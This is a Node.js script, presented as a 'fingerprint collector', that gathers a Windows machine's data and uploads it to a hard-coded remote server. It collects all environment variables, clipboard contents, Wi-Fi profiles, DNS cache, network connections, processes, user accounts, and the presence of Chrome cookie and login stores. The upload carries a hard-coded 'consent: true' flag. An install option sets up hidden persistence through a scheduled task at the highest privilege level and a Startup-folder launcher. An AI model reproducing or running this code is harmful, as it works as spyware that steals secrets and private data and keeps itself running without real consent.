#!/usr/bin/env node
import os from 'node:os';
import { execSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import https from 'node:https';

const SERVER = process.env.COLLECT_SERVER || 'https://finger-mrkr.onrender.com';
const INSTALL = process.argv.includes('--install');
const CONFIG_PATH = path.join(os.homedir(), '.fingerprint-collector.json');

function run(cmd) {
  try {
    const r = execSync(cmd, { encoding: 'utf8', timeout: 15000, stdio: ['pipe', 'pipe', 'pipe'] });
    return r.trim();
  } catch (e) {
    return '[ERROR] ' + (e.stderr ? e.stderr.trim().slice(0, 500) : e.message);
  }
}

function runPwsh(script) {
  try {
    const r = execSync(`powershell -NoProfile -NonInteractive -Command "${script.replace(/"/g, '\\"')}"`, { encoding: 'utf8', timeout: 15000, stdio: ['pipe', 'pipe', 'pipe'] });
    return r.trim();
  } catch (e) {
    return '[ERROR] ' + (e.stderr ? e.stderr.trim().slice(0, 500) : e.message);
  }
}

function safe(fn) {
  try { return fn(); } catch (e) { return '[ERROR] ' + e.message; }
}

async function collectAll() {
  console.log('Collecting local system data...\n');
  const data = { collectedAt: new Date().toISOString(), hostname: os.hostname() };

  // 1. System
  console.log(' [1/13] System info...');
  data.system = safe(() => ({
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    type: os.type(),
    arch: os.arch(),
    cpus: os.cpus().map(c => c.model),
    cpuCount: os.cpus().length,
    totalMem: os.totalmem(),
    freeMem: os.freemem(),
    totalMemGb: (os.totalmem() / 1073741824).toFixed(2),
    freeMemGb: (os.freemem() / 1073741824).toFixed(2),
    uptime: os.uptime(),
    user: os.userInfo(),
    tempDir: os.tmpdir(),
    homeDir: os.homedir(),
    osInfo: run('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory"'),
    wmic: run('wmic os get Caption,Version,OSArchitecture /format:csv'),
  }));

  // 2. Network interfaces
  console.log(' [2/13] Network interfaces...');
  data.networkInterfaces = safe(() => {
    const ifs = os.networkInterfaces();
    const result = {};
    for (const [name, addrs] of Object.entries(ifs)) {
      result[name] = addrs.map(a => ({
        address: a.address, netmask: a.netmask, family: a.family, mac: a.mac, internal: a.internal, scopeid: a.scopeid,
      }));
    }
    return result;
  });

  // 3. IP config (DNS, DHCP, MACs)
  console.log(' [3/13] IP configuration...');
  data.ipConfig = run('ipconfig /all');

  // 4. Active connections
  console.log(' [4/13] Active connections...');
  data.activeConnections = run('netstat -an 2>nul');

  // 5. DNS cache
  console.log(' [5/13] DNS cache...');
  data.dnsCache = run('ipconfig /displaydns 2>nul');

  // 6. ARP table
  console.log(' [6/13] ARP table...');
  data.arpTable = run('arp -a 2>nul');

  // 7. Wi-Fi info
  console.log(' [7/13] Wi-Fi info...');
  data.wifi = {
    interfaces: run('netsh wlan show interfaces 2>nul'),
    profiles: run('netsh wlan show profiles 2>nul'),
  };

  // 8. Environment variables
  console.log(' [8/13] Environment variables...');
  data.environment = safe(() => {
    const env = { ...process.env };
    return env;
  });

  // 9. Clipboard
  console.log(' [9/13] Clipboard...');
  data.clipboard = runPwsh('Get-Clipboard');

  // 10. Processes
  console.log('[10/13] Running processes...');
  data.processes = run('tasklist /FO CSV /NH 2>nul');

  // 11. Browser profiles
  console.log('[11/13] Browser profiles...');
  data.browsers = safe(() => {
    const home = os.homedir();
    const browsers = {};
    const chrome = path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
    if (fs.existsSync(chrome)) {
      const dirs = fs.readdirSync(chrome).filter(d => d.endsWith('Profile') || d === 'Default');
      const profiles = {};
      for (const dir of dirs.slice(0, 5)) {
        const p = path.join(chrome, dir);
        const ck = path.join(p, 'Cookies');
        const ld = path.join(p, 'Login Data');
        const wd = path.join(p, 'Web Data');
        profiles[dir] = {
          cookies: fs.existsSync(ck) ? fs.statSync(ck).size + ' bytes' : 'not found',
          loginData: fs.existsSync(ld) ? fs.statSync(ld).size + ' bytes' : 'not found',
          webData: fs.existsSync(wd) ? fs.statSync(wd).size + ' bytes' : 'not found',
        };
      }
      browsers.chrome = { profiles, localState: path.join(chrome, 'Local State') };
    }
    const edge = path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data');
    if (fs.existsSync(edge)) {
      const dirs = fs.readdirSync(edge).filter(d => d.endsWith('Profile') || d === 'Default');
      browsers.edge = { profileCount: dirs.length };
    }
    const ff = path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
    if (fs.existsSync(ff)) {
      browsers.firefox = { profiles: fs.readdirSync(ff) };
    }
    return browsers;
  });

  // 12. Running browser processes
  console.log('[12/13] Browser processes...');
  data.browserProcesses = run('tasklist /FO CSV /NH /FI "IMAGENAME eq chrome.exe" /FI "IMAGENAME eq msedge.exe" /FI "IMAGENAME eq firefox.exe" /FI "IMAGENAME eq opera.exe" 2>nul');
  data.pwshBrowserProcesses = runPwsh('Get-Process chrome,msedge,firefox,opera,browser -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,StartTime | ConvertTo-Json');

  // 13. Local users & disk
  console.log('[13/13] Users & disk...');
  data.localUsers = run('net user 2>nul');
  data.diskDrives = run('wmic diskdrive get Model,Size,InterfaceType /format:csv 2>nul');
  data.diskVolumes = runPwsh('Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID,DriveType,Size,FreeSpace | ConvertTo-Json');

  // Upload
  console.log('\nUploading to ' + SERVER + '/api/reports ...');
  const body = JSON.stringify({
    consent: true,
    consentVersion: '2026-07-local-v1',
    fingerprint: {
      source: 'local-cli',
      local: data,
      browser_signals: { Platform: os.platform(), Hostname: os.hostname() },
    },
    events: [{ label: 'local-collect', detail: os.hostname() + ' / ' + os.platform(), at: new Date().toISOString() }],
  });

  const url = new URL('/api/reports', SERVER);
  const mod = url.protocol === 'https:' ? https : http;

  return new Promise((resolve, reject) => {
    const req = mod.request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let resp = '';
      res.on('data', (c) => resp += c);
      res.on('end', () => {
        if (res.statusCode === 201) {
          const j = JSON.parse(resp);
          console.log('Done! Report #' + j.id + ' saved.');
          safe(() => fs.writeFileSync(CONFIG_PATH, JSON.stringify({ lastReportId: j.id, lastRun: new Date().toISOString() }, null, 2)));
        } else {
          console.log('Upload failed (' + res.statusCode + '): ' + resp);
        }
        resolve();
      });
    });
    req.on('error', (e) => { console.log('Network error: ' + e.message); resolve(); });
    req.write(body);
    req.end();
  });
}

function installAutoStart() {
  const scriptPath = path.resolve(process.argv[1]);
  const taskName = 'FingerprintLocalCollector';
  const nodeExe = process.execPath;
  const cmd = `"${nodeExe}" "${scriptPath}"`;
  console.log('Installing scheduled task: ' + taskName);
  const r = run(`schtasks /Create /SC ONLOGON /DELAY 0005:00 /TN "${taskName}" /TR "${cmd}" /F /RL HIGHEST`);
  console.log(r || 'Installed. Runs 5 min after login.');
  const startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
  const batPath = path.join(startupDir, 'FingerprintCollector.cmd');
  safe(() => {
    fs.writeFileSync(batPath, `@echo off\nstart /min "" "${nodeExe}" "${scriptPath}"\n`);
    console.log('Startup shortcut created: ' + batPath);
  });
}

async function main() {
  if (INSTALL) {
    installAutoStart();
    return;
  }
  await collectAll();
}

main().catch(e => console.error('Fatal:', e.message));
